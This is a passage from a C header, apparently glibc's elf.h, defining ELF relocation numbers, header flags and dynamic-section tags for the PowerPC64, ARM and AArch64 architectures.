#define R_PPC64_SECTOFF		R_PPC_SECTOFF
#define R_PPC64_SECTOFF_LO	R_PPC_SECTOFF_LO
#define R_PPC64_SECTOFF_HI	R_PPC_SECTOFF_HI
#define R_PPC64_SECTOFF_HA	R_PPC_SECTOFF_HA
#define R_PPC64_ADDR30		37 /* word30 (S + A - P) >> 2 */
#define R_PPC64_ADDR64		38 /* doubleword64 S + A */
#define R_PPC64_ADDR16_HIGHER	39 /* half16 #higher(S + A) */
#define R_PPC64_ADDR16_HIGHERA	40 /* half16 #highera(S + A) */
#define R_PPC64_ADDR16_HIGHEST	41 /* half16 #highest(S + A) */
#define R_PPC64_ADDR16_HIGHESTA	42 /* half16 #highesta(S + A) */
#define R_PPC64_UADDR64		43 /* doubleword64 S + A */
#define R_PPC64_REL64		44 /* doubleword64 S + A - P */
#define R_PPC64_PLT64		45 /* doubleword64 L + A */
#define R_PPC64_PLTREL64	46 /* doubleword64 L + A - P */
#define R_PPC64_TOC16		47 /* half16* S + A - .TOC */
#define R_PPC64_TOC16_LO	48 /* half16 #lo(S + A - .TOC.) */
#define R_PPC64_TOC16_HI	49 /* half16 #hi(S + A - .TOC.) */
#define R_PPC64_TOC16_HA	50 /* half16 #ha(S + A - .TOC.) */
#define R_PPC64_TOC		51 /* doubleword64 .TOC */
#define R_PPC64_PLTGOT16	52 /* half16* M + A */
#define R_PPC64_PLTGOT16_LO	53 /* half16 #lo(M + A) */
#define R_PPC64_PLTGOT16_HI	54 /* half16 #hi(M + A) */
#define R_PPC64_PLTGOT16_HA	55 /* half16 #ha(M + A) */

#define R_PPC64_ADDR16_DS	56 /* half16ds* (S + A) >> 2 */
#define R_PPC64_ADDR16_LO_DS	57 /* half16ds  #lo(S + A) >> 2 */
#define R_PPC64_GOT16_DS	58 /* half16ds* (G + A) >> 2 */
#define R_PPC64_GOT16_LO_DS	59 /* half16ds  #lo(G + A) >> 2 */
#define R_PPC64_PLT16_LO_DS	60 /* half16ds  #lo(L + A) >> 2 */
#define R_PPC64_SECTOFF_DS	61 /* half16ds* (R + A) >> 2 */
#define R_PPC64_SECTOFF_LO_DS	62 /* half16ds  #lo(R + A) >> 2 */
#define R_PPC64_TOC16_DS	63 /* half16ds* (S + A - .TOC.) >> 2 */
#define R_PPC64_TOC16_LO_DS	64 /* half16ds  #lo(S + A - .TOC.) >> 2 */
#define R_PPC64_PLTGOT16_DS	65 /* half16ds* (M + A) >> 2 */
#define R_PPC64_PLTGOT16_LO_DS	66 /* half16ds  #lo(M + A) >> 2 */

/* PowerPC64 relocations defined for the TLS access ABI.  */
#define R_PPC64_TLS		67 /* none	(sym+add)@tls */
#define R_PPC64_DTPMOD64	68 /* doubleword64 (sym+add)@dtpmod */
#define R_PPC64_TPREL16		69 /* half16*	(sym+add)@tprel */
#define R_PPC64_TPREL16_LO	70 /* half16	(sym+add)@tprel@l */
#define R_PPC64_TPREL16_HI	71 /* half16	(sym+add)@tprel@h */
#define R_PPC64_TPREL16_HA	72 /* half16	(sym+add)@tprel@ha */
#define R_PPC64_TPREL64		73 /* doubleword64 (sym+add)@tprel */
#define R_PPC64_DTPREL16	74 /* half16*	(sym+add)@dtprel */
#define R_PPC64_DTPREL16_LO	75 /* half16	(sym+add)@dtprel@l */
#define R_PPC64_DTPREL16_HI	76 /* half16	(sym+add)@dtprel@h */
#define R_PPC64_DTPREL16_HA	77 /* half16	(sym+add)@dtprel@ha */
#define R_PPC64_DTPREL64	78 /* doubleword64 (sym+add)@dtprel */
#define R_PPC64_GOT_TLSGD16	79 /* half16*	(sym+add)@got@tlsgd */
#define R_PPC64_GOT_TLSGD16_LO	80 /* half16	(sym+add)@got@tlsgd@l */
#define R_PPC64_GOT_TLSGD16_HI	81 /* half16	(sym+add)@got@tlsgd@h */
#define R_PPC64_GOT_TLSGD16_HA	82 /* half16	(sym+add)@got@tlsgd@ha */
#define R_PPC64_GOT_TLSLD16	83 /* half16*	(sym+add)@got@tlsld */
#define R_PPC64_GOT_TLSLD16_LO	84 /* half16	(sym+add)@got@tlsld@l */
#define R_PPC64_GOT_TLSLD16_HI	85 /* half16	(sym+add)@got@tlsld@h */
#define R_PPC64_GOT_TLSLD16_HA	86 /* half16	(sym+add)@got@tlsld@ha */
#define R_PPC64_GOT_TPREL16_DS	87 /* half16ds*	(sym+add)@got@tprel */
#define R_PPC64_GOT_TPREL16_LO_DS 88 /* half16ds (sym+add)@got@tprel@l */
#define R_PPC64_GOT_TPREL16_HI	89 /* half16	(sym+add)@got@tprel@h */
#define R_PPC64_GOT_TPREL16_HA	90 /* half16	(sym+add)@got@tprel@ha */
#define R_PPC64_GOT_DTPREL16_DS	91 /* half16ds*	(sym+add)@got@dtprel */
#define R_PPC64_GOT_DTPREL16_LO_DS 92 /* half16ds (sym+add)@got@dtprel@l */
#define R_PPC64_GOT_DTPREL16_HI	93 /* half16	(sym+add)@got@dtprel@h */
#define R_PPC64_GOT_DTPREL16_HA	94 /* half16	(sym+add)@got@dtprel@ha */
#define R_PPC64_TPREL16_DS	95 /* half16ds*	(sym+add)@tprel */
#define R_PPC64_TPREL16_LO_DS	96 /* half16ds	(sym+add)@tprel@l */
#define R_PPC64_TPREL16_HIGHER	97 /* half16	(sym+add)@tprel@higher */
#define R_PPC64_TPREL16_HIGHERA	98 /* half16	(sym+add)@tprel@highera */
#define R_PPC64_TPREL16_HIGHEST	99 /* half16	(sym+add)@tprel@highest */
#define R_PPC64_TPREL16_HIGHESTA 100 /* half16	(sym+add)@tprel@highesta */
#define R_PPC64_DTPREL16_DS	101 /* half16ds* (sym+add)@dtprel */
#define R_PPC64_DTPREL16_LO_DS	102 /* half16ds	(sym+add)@dtprel@l */
#define R_PPC64_DTPREL16_HIGHER	103 /* half16	(sym+add)@dtprel@higher */
#define R_PPC64_DTPREL16_HIGHERA 104 /* half16	(sym+add)@dtprel@highera */
#define R_PPC64_DTPREL16_HIGHEST 105 /* half16	(sym+add)@dtprel@highest */
#define R_PPC64_DTPREL16_HIGHESTA 106 /* half16	(sym+add)@dtprel@highesta */
#define R_PPC64_TLSGD		107 /* none	(sym+add)@tlsgd */
#define R_PPC64_TLSLD		108 /* none	(sym+add)@tlsld */
#define R_PPC64_TOCSAVE		109 /* none */

/* Added when HA and HI relocs were changed to report overflows.  */
#define R_PPC64_ADDR16_HIGH	110
#define R_PPC64_ADDR16_HIGHA	111
#define R_PPC64_TPREL16_HIGH	112
#define R_PPC64_TPREL16_HIGHA	113
#define R_PPC64_DTPREL16_HIGH	114
#define R_PPC64_DTPREL16_HIGHA	115

/* GNU extension to support local ifunc.  */
#define R_PPC64_JMP_IREL	247
#define R_PPC64_IRELATIVE	248
#define R_PPC64_REL16		249	/* half16   (sym+add-.) */
#define R_PPC64_REL16_LO	250	/* half16   (sym+add-.)@l */
#define R_PPC64_REL16_HI	251	/* half16   (sym+add-.)@h */
#define R_PPC64_REL16_HA	252	/* half16   (sym+add-.)@ha */

/* e_flags bits specifying ABI.
   1 for original function descriptor using ABI,
   2 for revised ABI without function descriptors,
   0 for unspecified or not using any features affected by the differences.  */
#define EF_PPC64_ABI	3

/* PowerPC64 specific values for the Dyn d_tag field.  */
#define DT_PPC64_GLINK  (DT_LOPROC + 0)
#define DT_PPC64_OPD	(DT_LOPROC + 1)
#define DT_PPC64_OPDSZ	(DT_LOPROC + 2)
#define DT_PPC64_OPT	(DT_LOPROC + 3)
#define DT_PPC64_NUM    4

/* PowerPC64 specific bits in the DT_PPC64_OPT Dyn entry.  */
#define PPC64_OPT_TLS		1
#define PPC64_OPT_MULTI_TOC	2
#define PPC64_OPT_LOCALENTRY	4

/* PowerPC64 specific values for the Elf64_Sym st_other field.  */
#define STO_PPC64_LOCAL_BIT	5
#define STO_PPC64_LOCAL_MASK	(7 << STO_PPC64_LOCAL_BIT)
#define PPC64_LOCAL_ENTRY_OFFSET(other)				\
 (((1 << (((other) & STO_PPC64_LOCAL_MASK) >> STO_PPC64_LOCAL_BIT)) >> 2) << 2)


/* ARM specific declarations */

/* Processor specific flags for the ELF header e_flags field.  */
#define EF_ARM_RELEXEC		0x01
#define EF_ARM_HASENTRY		0x02
#define EF_ARM_INTERWORK	0x04
#define EF_ARM_APCS_26		0x08
#define EF_ARM_APCS_FLOAT	0x10
#define EF_ARM_PIC		0x20
#define EF_ARM_ALIGN8		0x40 /* 8-bit structure alignment is in use */
#define EF_ARM_NEW_ABI		0x80
#define EF_ARM_OLD_ABI		0x100
#define EF_ARM_SOFT_FLOAT	0x200
#define EF_ARM_VFP_FLOAT	0x400
#define EF_ARM_MAVERICK_FLOAT	0x800

#define EF_ARM_ABI_FLOAT_SOFT	0x200   /* NB conflicts with EF_ARM_SOFT_FLOAT */
#define EF_ARM_ABI_FLOAT_HARD	0x400   /* NB conflicts with EF_ARM_VFP_FLOAT */


/* Other constants defined in the ARM ELF spec. version B-01.  */
/* NB. These conflict with values defined above.  */
#define EF_ARM_SYMSARESORTED	0x04
#define EF_ARM_DYNSYMSUSESEGIDX	0x08
#define EF_ARM_MAPSYMSFIRST	0x10
#define EF_ARM_EABIMASK		0XFF000000

/* Constants defined in AAELF.  */
#define EF_ARM_BE8	    0x00800000
#define EF_ARM_LE8	    0x00400000

#define EF_ARM_EABI_VERSION(flags)	((flags) & EF_ARM_EABIMASK)
#define EF_ARM_EABI_UNKNOWN	0x00000000
#define EF_ARM_EABI_VER1	0x01000000
#define EF_ARM_EABI_VER2	0x02000000
#define EF_ARM_EABI_VER3	0x03000000
#define EF_ARM_EABI_VER4	0x04000000
#define EF_ARM_EABI_VER5	0x05000000

/* Additional symbol types for Thumb.  */
#define STT_ARM_TFUNC		STT_LOPROC /* A Thumb function.  */
#define STT_ARM_16BIT		STT_HIPROC /* A Thumb label.  */

/* ARM-specific values for sh_flags */
#define SHF_ARM_ENTRYSECT	0x10000000 /* Section contains an entry point */
#define SHF_ARM_COMDEF		0x80000000 /* Section may be multiply defined
					      in the input to a link step.  */

/* ARM-specific program header flags */
#define PF_ARM_SB		0x10000000 /* Segment contains the location
					      addressed by the static base. */
#define PF_ARM_PI		0x20000000 /* Position-independent segment.  */
#define PF_ARM_ABS		0x40000000 /* Absolute segment.  */

/* Processor specific values for the Phdr p_type field.  */
#define PT_ARM_EXIDX		(PT_LOPROC + 1)	/* ARM unwind segment.  */

/* Processor specific values for the Shdr sh_type field.  */
#define SHT_ARM_EXIDX		(SHT_LOPROC + 1) /* ARM unwind section.  */
#define SHT_ARM_PREEMPTMAP	(SHT_LOPROC + 2) /* Preemption details.  */
#define SHT_ARM_ATTRIBUTES	(SHT_LOPROC + 3) /* ARM attributes section.  */


/* AArch64 relocs.  */

#define R_AARCH64_NONE            0	/* No relocation.  */

/* ILP32 AArch64 relocs.  */
#define R_AARCH64_P32_ABS32		  1	/* Direct 32 bit.  */
#define R_AARCH64_P32_COPY		180	/* Copy symbol at runtime.  */
#define R_AARCH64_P32_GLOB_DAT		181	/* Create GOT entry.  */
#define R_AARCH64_P32_JUMP_SLOT		182	/* Create PLT entry.  */
#define R_AARCH64_P32_RELATIVE		183	/* Adjust by program base.  */
#define R_AARCH64_P32_TLS_DTPMOD	184	/* Module number, 32 bit.  */
#define R_AARCH64_P32_TLS_DTPREL	185	/* Module-relative offset, 32 bit.  */
#define R_AARCH64_P32_TLS_TPREL		186	/* TP-relative offset, 32 bit.  */
#define R_AARCH64_P32_TLSDESC		187	/* TLS Descriptor.  */
#define R_AARCH64_P32_IRELATIVE		188	/* STT_GNU_IFUNC relocation. */

/* LP64 AArch64 relocs.  */
#define R_AARCH64_ABS64         257	/* Direct 64 bit. */
#define R_AARCH64_ABS32         258	/* Direct 32 bit.  */
#define R_AARCH64_ABS16		259	/* Direct 16-bit.  */
#define R_AARCH64_PREL64	260	/* PC-relative 64-bit.	*/
#define R_AARCH64_PREL32	261	/* PC-relative 32-bit.	*/
#define R_AARCH64_PREL16	262	/* PC-relative 16-bit.	*/
#define R_AARCH64_MOVW_UABS_G0	263	/* Dir. MOVZ imm. from bits 15:0.  */
#define R_AARCH64_MOVW_UABS_G0_NC 264	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_UABS_G1	265	/* Dir. MOVZ imm. from bits 31:16.  */
#define R_AARCH64_MOVW_UABS_G1_NC 266	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_UABS_G2	267	/* Dir. MOVZ imm. from bits 47:32.  */
#define R_AARCH64_MOVW_UABS_G2_NC 268	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_UABS_G3	269	/* Dir. MOV{K,Z} imm. from 63:48.  */
#define R_AARCH64_MOVW_SABS_G0	270	/* Dir. MOV{N,Z} imm. from 15:0.  */
#define R_AARCH64_MOVW_SABS_G1	271	/* Dir. MOV{N,Z} imm. from 31:16.  */
#define R_AARCH64_MOVW_SABS_G2	272	/* Dir. MOV{N,Z} imm. from 47:32.  */
#define R_AARCH64_LD_PREL_LO19	273	/* PC-rel. LD imm. from bits 20:2.  */
#define R_AARCH64_ADR_PREL_LO21	274	/* PC-rel. ADR imm. from bits 20:0.  */
#define R_AARCH64_ADR_PREL_PG_HI21 275	/* Page-rel. ADRP imm. from 32:12.  */
#define R_AARCH64_ADR_PREL_PG_HI21_NC 276 /* Likewise; no overflow check.  */
#define R_AARCH64_ADD_ABS_LO12_NC 277	/* Dir. ADD imm. from bits 11:0.  */
#define R_AARCH64_LDST8_ABS_LO12_NC 278	/* Likewise for LD/ST; no check. */
#define R_AARCH64_TSTBR14	279	/* PC-rel. TBZ/TBNZ imm. from 15:2.  */
#define R_AARCH64_CONDBR19	280	/* PC-rel. cond. br. imm. from 20:2. */
#define R_AARCH64_JUMP26	282	/* PC-rel. B imm. from bits 27:2.  */
#define R_AARCH64_CALL26	283	/* Likewise for CALL.  */
#define R_AARCH64_LDST16_ABS_LO12_NC 284 /* Dir. ADD imm. from bits 11:1.  */
#define R_AARCH64_LDST32_ABS_LO12_NC 285 /* Likewise for bits 11:2.  */
#define R_AARCH64_LDST64_ABS_LO12_NC 286 /* Likewise for bits 11:3.  */
#define R_AARCH64_MOVW_PREL_G0	287	/* PC-rel. MOV{N,Z} imm. from 15:0.  */
#define R_AARCH64_MOVW_PREL_G0_NC 288	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_PREL_G1	289	/* PC-rel. MOV{N,Z} imm. from 31:16. */
#define R_AARCH64_MOVW_PREL_G1_NC 290	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_PREL_G2	291	/* PC-rel. MOV{N,Z} imm. from 47:32. */
#define R_AARCH64_MOVW_PREL_G2_NC 292	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_PREL_G3	293	/* PC-rel. MOV{N,Z} imm. from 63:48. */
#define R_AARCH64_LDST128_ABS_LO12_NC 299 /* Dir. ADD imm. from bits 11:4.  */
#define R_AARCH64_MOVW_GOTOFF_G0 300	/* GOT-rel. off. MOV{N,Z} imm. 15:0. */
#define R_AARCH64_MOVW_GOTOFF_G0_NC 301	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_GOTOFF_G1 302	/* GOT-rel. o. MOV{N,Z} imm. 31:16.  */
#define R_AARCH64_MOVW_GOTOFF_G1_NC 303	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_GOTOFF_G2 304	/* GOT-rel. o. MOV{N,Z} imm. 47:32.  */
#define R_AARCH64_MOVW_GOTOFF_G2_NC 305	/* Likewise for MOVK; no check.  */
#define R_AARCH64_MOVW_GOTOFF_G3 306	/* GOT-rel. o. MOV{N,Z} imm. 63:48.  */
#define R_AARCH64_GOTREL64	307	/* GOT-relative 64-bit.  */
#define R_AARCH64_GOTREL32	308	/* GOT-relative 32-bit.  */
#define R_AARCH64_GOT_LD_PREL19	309	/* PC-rel. GOT off. load imm. 20:2.  */
#define R_AARCH64_LD64_GOTOFF_LO15 310	/* GOT-rel. off. LD/ST imm. 14:3.  */
#define R_AARCH64_ADR_GOT_PAGE	311	/* P-page-rel. GOT off. ADRP 32:12.  */
#define R_AARCH64_LD64_GOT_LO12_NC 312	/* Dir. GOT off. LD/ST imm. 11:3.  */
#define R_AARCH64_LD64_GOTPAGE_LO15 313	/* GOT-page-rel. GOT off. LD/ST 14:3 */
#define R_AARCH64_TLSGD_ADR_PREL21 512	/* PC-relative ADR imm. 20:0.  */
#define R_AARCH64_TLSGD_ADR_PAGE21 513	/* page-rel. ADRP imm. 32:12.  */
#define R_AARCH64_TLSGD_ADD_LO12_NC 514	/* direct ADD imm. from 11:0.  */
#define R_AARCH64_TLSGD_MOVW_G1	515	/* GOT-rel. MOV{N,Z} 31:16.  */
#define R_AARCH64_TLSGD_MOVW_G0_NC 516	/* GOT-rel. MOVK imm. 15:0.  */
#define R_AARCH64_TLSLD_ADR_PREL21 517	/* Like 512; local dynamic model.  */
#define R_AARCH64_TLSLD_ADR_PAGE21 518	/* Like 513; local dynamic model.  */
#define R_AARCH64_TLSLD_ADD_LO12_NC 519	/* Like 514; local dynamic model.  */
#define R_AARCH64_TLSLD_MOVW_G1	520	/* Like 515; local dynamic model.  */
#define R_AARCH64_TLSLD_MOVW_G0_NC 521	/* Like 516; local dynamic model.  */
#define R_AARCH64_TLSLD_LD_PREL19 522	/* TLS PC-rel. load imm. 20:2.  */
#define R_AARCH64_TLSLD_MOVW_DTPREL_G2 523 /* TLS DTP-rel. MOV{N,Z} 47:32.  */
#define R_AARCH64_TLSLD_MOVW_DTPREL_G1 524 /* TLS DTP-rel. MOV{N,Z} 31:16.  */
#define R_AARCH64_TLSLD_MOVW_DTPREL_G1_NC 525 /* Likewise; MOVK; no check.  */
#define R_AARCH64_TLSLD_MOVW_DTPREL_G0 526 /* TLS DTP-rel. MOV{N,Z} 15:0.  */
#define R_AARCH64_TLSLD_MOVW_DTPREL_G0_NC 527 /* Likewise; MOVK; no check.  */
#define R_AARCH64_TLSLD_ADD_DTPREL_HI12 528 /* DTP-rel. ADD imm. from 23:12. */
#define R_AARCH64_TLSLD_ADD_DTPREL_LO12 529 /* DTP-rel. ADD imm. from 11:0.  */
#define R_AARCH64_TLSLD_ADD_DTPREL_LO12_NC 530 /* Likewise; no ovfl. check.  */
#define R_AARCH64_TLSLD_LDST8_DTPREL_LO12 531 /* DTP-rel. LD/ST imm. 11:0.  */
#define R_AARCH64_TLSLD_LDST8_DTPREL_LO12_NC 532 /* Likewise; no check.  */
#define R_AARCH64_TLSLD_LDST16_DTPREL_LO12 533 /* DTP-rel. LD/ST imm. 11:1.  */
#define R_AARCH64_TLSLD_LDST16_DTPREL_LO12_NC 534 /* Likewise; no check.  */
#define R_AARCH64_TLSLD_LDST32_DTPREL_LO12 535 /* DTP-rel. LD/ST imm. 11:2.  */
#define R_AARCH64_TLSLD_LDST32_DTPREL_LO12_NC 536 /* Likewise; no check.  */
#define R_AARCH64_TLSLD_LDST64_DTPREL_LO12 537 /* DTP-rel. LD/ST imm. 11:3.  */
#define R_AARCH64_TLSLD_LDST64_DTPREL_LO12_NC 538 /* Likewise; no check.  */
#define R_AARCH64_TLSIE_MOVW_GOTTPREL_G1 539 /* GOT-rel. MOV{N,Z} 31:16.  */
#define R_AARCH64_TLSIE_MOVW_GOTTPREL_G0_NC 540 /* GOT-rel. MOVK 15:0.  */
#define R_AARCH64_TLSIE_ADR_GOTTPREL_PAGE21 541 /* Page-rel. ADRP 32:12.  */
#define R_AARCH64_TLSIE_LD64_GOTTPREL_LO12_NC 542 /* Direct LD off. 11:3.  */
#define R_AARCH64_TLSIE_LD_GOTTPREL_PREL19 543 /* PC-rel. load imm. 20:2.  */
#define R_AARCH64_TLSLE_MOVW_TPREL_G2 544 /* TLS TP-rel. MOV{N,Z} 47:32.  */
#define R_AARCH64_TLSLE_MOVW_TPREL_G1 545 /* TLS TP-rel. MOV{N,Z} 31:16.  */
#define R_AARCH64_TLSLE_MOVW_TPREL_G1_NC 546 /* Likewise; MOVK; no check.  */
#define R_AARCH64_TLSLE_MOVW_TPREL_G0 547 /* TLS TP-rel. MOV{N,Z} 15:0.  */
#define R_AARCH64_TLSLE_MOVW_TPREL_G0_NC 548 /* Likewise; MOVK; no check.  */
#define R_AARCH64_TLSLE_ADD_TPREL_HI12 549 /* TP-rel. ADD imm. 23:12.  */
#define R_AARCH64_TLSLE_ADD_TPREL_LO12 550 /* TP-rel. ADD imm. 11:0.  */
#define R_AARCH64_TLSLE_ADD_TPREL_LO12_NC 551 /* Likewise; no ovfl. check.  */
#define R_AARCH64_TLSLE_LDST8_TPREL_LO12 552 /* TP-rel. LD/ST off. 11:0.  */
#define R_AARCH64_TLSLE_LDST8_TPREL_LO12_NC 553 /* Likewise; no ovfl. check. */
#define R_AARCH64_TLSLE_LDST16_TPREL_LO12 554 /* TP-rel. LD/ST off. 11:1.  */
#define R_AARCH64_TLSLE_LDST16_TPREL_LO12_NC 555 /* Likewise; no check.  */
#define R_AARCH64_TLSLE_LDST32_TPREL_LO12 556 /* TP-rel. LD/ST off. 11:2.  */
#define R_AARCH64_TLSLE_LDST32_TPREL_LO12_NC 557 /* Likewise; no check.  */
#define R_AARCH64_TLSLE_LDST64_TPREL_LO12 558 /* TP-rel. LD/ST off. 11:3.  */
#define R_AARCH64_TLSLE_LDST64_TPREL_LO12_NC 559 /* Likewise; no check.  */
#define R_AARCH64_TLSDESC_LD_PREL19 560	/* PC-rel. load immediate 20:2.  */
#define R_AARCH64_TLSDESC_ADR_PREL21 561 /* PC-rel. ADR immediate 20:0.  */
#define R_AARCH64_TLSDESC_ADR_PAGE21 562 /* Page-rel. ADRP imm. 32:12.  */
#define R_AARCH64_TLSDESC_LD64_LO12 563	/* Direct LD off. from 11:3.  */
#define R_AARCH64_TLSDESC_ADD_LO12 564	/* Direct ADD imm. from 11:0.  */
#define R_AARCH64_TLSDESC_OFF_G1 565	/* GOT-rel. MOV{N,Z} imm. 31:16.  */
#define R_AARCH64_TLSDESC_OFF_G0_NC 566	/* GOT-rel. MOVK imm. 15:0; no ck.  */
#define R_AARCH64_TLSDESC_LDR	567	/* Relax LDR.  */
#define R_AARCH64_TLSDESC_ADD	568	/* Relax ADD.  */
#define R_AARCH64_TLSDESC_CALL	569	/* Relax BLR.  */
#define R_AARCH64_TLSLE_LDST128_TPREL_LO12 570 /* TP-rel. LD/ST off. 11:4.  */
#define R_AARCH64_TLSLE_LDST128_TPREL_LO12_NC 571 /* Likewise; no check.  */
#define R_AARCH64_TLSLD_LDST128_DTPREL_LO12 572 /* DTP-rel. LD/ST imm. 11:4. */
#define R_AARCH64_TLSLD_LDST128_DTPREL_LO12_NC 573 /* Likewise; no check.  */
#define R_AARCH64_COPY         1024	/* Copy symbol at runtime.  */
#define R_AARCH64_GLOB_DAT     1025	/* Create GOT entry.  */
#define R_AARCH64_JUMP_SLOT    1026	/* Create PLT entry.  */
#define R_AARCH64_RELATIVE     1027	/* Adjust by program base.  */
#define R_AARCH64_TLS_DTPMOD   1028	/* Module number, 64 bit.  */
#define R_AARCH64_TLS_DTPREL   1029	/* Module-relative offset, 64 bit.  */
#define R_AARCH64_TLS_TPREL    1030	/* TP-relative offset, 64 bit.  */
#define R_AARCH64_TLSDESC      1031	/* TLS Descriptor.  */
#define R_AARCH64_IRELATIVE	1032	/* STT_GNU_IFUNC relocation.  */

/* MTE memory tag segment type.  */
#define PT_AARCH64_MEMTAG_MTE	(PT_LOPROC + 2)

/* AArch64 specific values for the Dyn d_tag field.  */
#define DT_AARCH64_BTI_PLT	(DT_LOPROC + 1)
#define DT_AARCH64_PAC_PLT	(DT_LOPROC + 3)
#define DT_AARCH64_VARIANT_PCS	(DT_LOPROC + 5)
#define DT_AARCH64_NUM		6

/* AArch64 specific values for the st_other field.  */
#define STO_AARCH64_VARIANT_PCS 0x80

/* ARM relocs.  */

#define R_ARM_NONE		0	/* No reloc */
#define R_ARM_PC24		1	/* Deprecated PC relative 26
					   bit branch.  */
#define R_ARM_ABS32		2	/* Direct 32 bit  */
#define R_ARM_REL32		3	/* PC relative 32 bit */
#define R_ARM_PC13		4
#define R_ARM_ABS16		5	/* Direct 16 bit */
#define R_ARM_ABS12		6	/* Direct 12 bit */
#define R_ARM_THM_ABS5		7	/* Direct & 0x7C (LDR, STR).  */
#define R_ARM_ABS8		8	/* Direct 8 bit */
#define R_ARM_SBREL32		9
#define R_ARM_THM_PC22		10	/* PC relative 24 bit (Thumb32 BL).  */
#define R_ARM_THM_PC8		11	/* PC relative & 0x3FC
					   (Thumb16 LDR, ADD, ADR).  */
#define R_ARM_AMP_VCALL9	12
#define R_ARM_SWI24		13	/* Obsolete static relocation.  */
#define R_ARM_TLS_DESC		13      /* Dynamic relocation.  */
#define R_ARM_THM_SWI8		14	/* Reserved.  */
#define R_ARM_XPC25		15	/* Reserved.  */
#define R_ARM_THM_XPC22		16	/* Reserved.  */
#define R_ARM_TLS_DTPMOD32	17	/* ID of module containing symbol */
#define R_ARM_TLS_DTPOFF32	18	/* Offset in TLS block */
#define R_ARM_TLS_TPOFF32	19	/* Offset in static TLS block */
#define R_ARM_COPY		20	/* Copy symbol at runtime */
#define R_ARM_GLOB_DAT		21	/* Create GOT entry */
#define R_ARM_JUMP_SLOT		22	/* Create PLT entry */
#define R_ARM_RELATIVE		23	/* Adjust by program base */
#define R_ARM_GOTOFF		24	/* 32 bit offset to GOT */
#define R_ARM_GOTPC		25	/* 32 bit PC relative offset to GOT */
#define R_ARM_GOT32		26	/* 32 bit GOT entry */
#define R_ARM_PLT32		27	/* Deprecated, 32 bit PLT address.  */
#define R_ARM_CALL		28	/* PC relative 24 bit (BL, BLX).  */
#define R_ARM_JUMP24		29	/* PC relative 24 bit
					   (B, BL<cond>).  */
#define R_ARM_THM_JUMP24	30	/* PC relative 24 bit (Thumb32 B.W).  */
#define R_ARM_BASE_ABS		31	/* Adjust by program base.  */
#define R_ARM_ALU_PCREL_7_0	32	/* Obsolete.  */
#define R_ARM_ALU_PCREL_15_8	33	/* Obsolete.  */
#define R_ARM_ALU_PCREL_23_15	34	/* Obsolete.  */
#define R_ARM_LDR_SBREL_11_0	35	/* Deprecated, prog. base relative.  */
#define R_ARM_ALU_SBREL_19_12	36	/* Deprecated, prog. base relative.  */
#define R_ARM_ALU_SBREL_27_20	37	/* Deprecated, prog. base relative.  */
#define R_ARM_TARGET1		38
#define R_ARM_SBREL31		39	/* Program base relative.  */
#define R_ARM_V4BX		40
#define R_ARM_TARGET2		41
#define R_ARM_PREL31		42	/* 32 bit PC relative.  */
#define R_ARM_MOVW_ABS_NC	43	/* Direct 16-bit (MOVW).  */
#define R_ARM_MOVT_ABS		44	/* Direct high 16-bit (MOVT).  */
#define R_ARM_MOVW_PREL_NC	45	/* PC relative 16-bit (MOVW).  */
#define R_ARM_MOVT_PREL		46	/* PC relative (MOVT).  */
#define R_ARM_THM_MOVW_ABS_NC	47	/* Direct 16 bit (Thumb32 MOVW).  */
#define R_ARM_THM_MOVT_ABS	48	/* Direct high 16 bit
					   (Thumb32 MOVT).  */
#define R_ARM_THM_MOVW_PREL_NC	49	/* PC relative 16 bit
					   (Thumb32 MOVW).  */
#define R_ARM_THM_MOVT_PREL	50	/* PC relative high 16 bit
					   (Thumb32 MOVT).  */
#define R_ARM_THM_JUMP19	51	/* PC relative 20 bit
					   (Thumb32 B<cond>.W).  */
#define R_ARM_THM_JUMP6		52	/* PC relative X & 0x7E
					   (Thumb16 CBZ, CBNZ).  */
#define R_ARM_THM_ALU_PREL_11_0	53	/* PC relative 12 bit
					   (Thumb32 ADR.W).  */
#define R_ARM_THM_PC12		54	/* PC relative 12 bit
					   (Thumb32 LDR{D,SB,H,SH}).  */
#define R_ARM_ABS32_NOI		55	/* Direct 32-bit.  */
#define R_ARM_REL32_NOI		56	/* PC relative 32-bit.  */
#define R_ARM_ALU_PC_G0_NC	57	/* PC relative (ADD, SUB).  */
#define R_ARM_ALU_PC_G0		58	/* PC relative (ADD, SUB).  */
#define R_ARM_ALU_PC_G1_NC	59	/* PC relative (ADD, SUB).  */
#define R_ARM_ALU_PC_G1		60	/* PC relative (ADD, SUB).  */
#define R_ARM_ALU_PC_G2		61	/* PC relative (ADD, SUB).  */
#define R_ARM_LDR_PC_G1		62	/* PC relative (LDR,STR,LDRB,STRB).  */
#define R_ARM_LDR_PC_G2		63	/* PC relative (LDR,STR,LDRB,STRB).  */
#define R_ARM_LDRS_PC_G0	64	/* PC relative (STR{D,H},
					   LDR{D,SB,H,SH}).  */
#define R_ARM_LDRS_PC_G1	65	/* PC relative (STR{D,H},
					   LDR{D,SB,H,SH}).  */
#define R_ARM_LDRS_PC_G2	66	/* PC relative (STR{D,H},
					   LDR{D,SB,H,SH}).  */
#define R_ARM_LDC_PC_G0		67	/* PC relative (LDC, STC).  */
#define R_ARM_LDC_PC_G1		68	/* PC relative (LDC, STC).  */
#define R_ARM_LDC_PC_G2		69	/* PC relative (LDC, STC).  */
#define R_ARM_ALU_SB_G0_NC	70	/* Program base relative (ADD,SUB).  */
#define R_ARM_ALU_SB_G0		71	/* Program base relative (ADD,SUB).  */
#define R_ARM_ALU_SB_G1_NC	72	/* Program base relative (ADD,SUB).  */
#define R_ARM_ALU_SB_G1		73	/* Program base relative (ADD,SUB).  */
#define R_ARM_ALU_SB_G2		74	/* Program base relative (ADD,SUB).  */
#define R_ARM_LDR_SB_G0		75	/* Program base relative (LDR,
					   STR, LDRB, STRB).  */
#define R_ARM_LDR_SB_G1		76	/* Program base relative
					   (LDR, STR, LDRB, STRB).  */
#define R_ARM_LDR_SB_G2		77	/* Program base relative
					   (LDR, STR, LDRB, STRB).  */
#define R_ARM_LDRS_SB_G0	78	/* Program base relative
					   (LDR, STR, LDRB, STRB).  */
